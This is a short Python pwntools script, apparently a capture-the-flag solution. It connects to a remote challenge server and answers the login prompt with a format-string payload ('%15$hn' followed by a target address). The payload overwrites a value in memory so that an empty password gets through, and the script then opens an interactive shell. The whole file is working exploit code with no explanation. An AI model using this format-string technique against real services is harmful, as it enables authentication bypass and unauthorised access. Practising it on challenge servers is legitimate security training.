from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./run')
s_addr=0x00000000004040C0
p=remote('t.ctf.qwq.cc',49284)
print('realhack')
pause()
p.recvuntil(b'Please login:\nUsername:')
payload=b"%15$hnaa"+p64(s_addr)
p.sendline(payload)
print(p.recvuntil(b'Password:'))
passwd=b'\x00'
p.sendline(passwd)
p.interactive()